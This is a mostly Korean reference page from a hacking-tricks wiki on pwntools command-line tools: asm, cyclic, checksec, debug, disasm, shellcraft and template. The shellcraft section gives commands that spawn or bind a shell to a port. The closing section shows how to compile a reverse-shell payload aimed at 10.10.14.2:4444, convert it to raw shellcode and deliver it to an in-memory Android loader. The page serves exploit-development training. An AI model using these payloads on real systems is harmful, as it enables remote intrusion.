# PwnTools

{{#include ../../../banners/hacktricks-training.md}}
```
pip3 install pwntools
```
## Pwn asm

라인이나 파일에서 **opcodes**를 가져옵니다.
```
pwn asm "jmp esp"
pwn asm -i <filepath>
```
**선택 가능:**

- 출력 유형 (raw,hex,string,elf)
- 출력 파일 컨텍스트 (16,32,64,linux,windows...)
- 제외할 bytes (new lines, null, a list)
- encoder 선택; debug shellcode를 gdb로 실행하여 output을 확인

## **Pwn checksec**

Checksec 스크립트
```
pwn checksec <executable>
```
## Pwn constgrep

## Pwn cyclic

패턴 생성
```
pwn cyclic 3000
pwn cyclic -l faad
```
**선택 가능:**

- 사용되는 alphabet (기본값: lowercase chars)
- uniq pattern의 길이 (기본값: 4)
- context (16,32,64,linux,windows...)
- 오프셋 가져오기 (-l)

## Pwn debug

프로세스에 GDB를 연결
```
pwn debug --exec /bin/bash
pwn debug --pid 1234
pwn debug --process bash
```
**선택 가능:**

- executable별, name별 또는 pid context별 (16,32,64,linux,windows...)
- 실행할 gdbscript
- sysrootpath

## Pwn disablenx

binary의 nx 비활성화
```
pwn disablenx <filepath>
```
## Pwn disasm

hex opcodes를 디스어셈블
```
pwn disasm ffe4
```
**선택 가능:**

- context (16,32,64,linux,windows...)
- base 주소
- color(default)/no color

## Pwn elfdiff

두 파일 간의 차이점을 출력
```
pwn elfdiff <file1> <file2>
```
## Pwn hex

16진수 표현 얻기
```bash
pwn hex hola #Get hex of "hola" ascii
```
## Pwn phd

hexdump 가져오기
```
pwn phd <file>
```
**선택 가능:**

- 표시할 바이트 수
- 한 줄당 바이트 수 및 강조할 바이트
- 처음의 바이트 건너뛰기

## Pwn pwnstrip

## Pwn scrable

## Pwn shellcraft

shellcodes 가져오기
```
pwn shellcraft -l #List shellcodes
pwn shellcraft -l amd #Shellcode with amd in the name
pwn shellcraft -f hex amd64.linux.sh #Create in C and run
pwn shellcraft -r amd64.linux.sh #Run to test. Get shell
pwn shellcraft .r amd64.linux.bindsh 9095 #Bind SH to port
```
**선택 가능:**

- shellcode와 인자
- 출력 파일
- 출력 형식
- debug (attach dbg to shellcode)
- before (debug trap before code)
- after
- opcodes 사용 회피 (기본: null과 new line 제외)
- shellcode 실행
- 색상/무색상
- syscalls 목록
- 가능한 shellcodes 목록
- ELF를 shared library로 생성

## Pwn template

python 템플릿 가져오기
```
pwn template
```
**선택 가능:** host, port, user, pass, path and quiet

## Pwn unhex

hex에서 string으로
```
pwn unhex 686f6c61
```
## Pwn 업데이트

pwntools를 업데이트하려면
```
pwn update
```
## ELF → raw shellcode 패키징 (loader_append)

Pwntools는 독립 실행형 ELF를 세그먼트를 스스로 매핑하고 원래 엔트리포인트로 실행을 전달하는 단일 raw shellcode 블롭으로 변환할 수 있습니다. 이는 다운로드한 바이트를 실행하기 위해 JNI를 호출하는 Android 앱 같은 메모리‑전용 로더에 이상적입니다.

Typical pipeline (amd64 example)

1) Build a static, position‑independent payload ELF (musl recommended for portability):
```bash
musl-gcc -O3 -s -static -o exploit exploit.c \
-DREV_SHELL_IP="\"10.10.14.2\"" -DREV_SHELL_PORT="\"4444\""
```
2) ELF → shellcode로 변환 (pwntools 사용):
```python
# exp2sc.py
from pwn import *
context.clear(arch='amd64')
elf = ELF('./exploit')
sc = asm(shellcraft.loader_append(elf.data, arch='amd64'))
open('sc','wb').write(sc)
print(f"ELF size={len(elf.data)} bytes, shellcode size={len(sc)} bytes")
```
3) sc를 메모리 로더(예: HTTP[S]를 통해)로 전달하여 프로세스 내에서 실행합니다.

Notes
- loader_append는 원본 ELF 프로그램을 shellcode에 임베드하고, 세그먼트를 mmaps하여 엔트리로 점프하는 소형 로더를 생성합니다.
- context.clear(arch=...)로 아키텍처를 명시하세요. arm64는 Android에서 일반적입니다.
- payload의 코드가 위치 비종속(position-independent)이 되도록 하고, 프로세스의 ASLR/NX에 대한 가정을 피하세요.

## 참고자료

- [Pwntools](https://docs.pwntools.com/en/stable/)
- [CoRPhone – ELF→shellcode pipeline used for Android in-memory execution](https://github.com/0xdevil/corphone)

{{#include ../../../banners/hacktricks-training.md}}
